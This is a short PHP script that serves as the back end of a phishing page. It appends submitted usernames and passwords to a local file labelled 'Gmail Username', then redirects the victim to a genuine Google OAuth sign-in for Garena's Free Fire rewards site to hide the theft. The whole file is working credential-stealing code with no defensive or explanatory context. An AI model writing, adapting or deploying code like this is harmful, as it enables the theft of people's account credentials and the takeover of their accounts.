<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=185753624591-3sg2arfuus5i1anc2jcfarepnf6cdlaq.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fauth.garena.com%2Foauth%2Flogin%2Fgoogle&response_type=code&scope=profile%20email%20openid&state=%2526response_type%253Dtoken%2526locale%253Dzh-TW%2526redirect_uri%253Dhttps%25253A%25252F%25252Freward.ff.garena.com%25252F%2526client_id%253D100067%2526all_platforms%253D1%2526platform%253D8&flowName=GeneralOAuthFlow');
exit();
?>
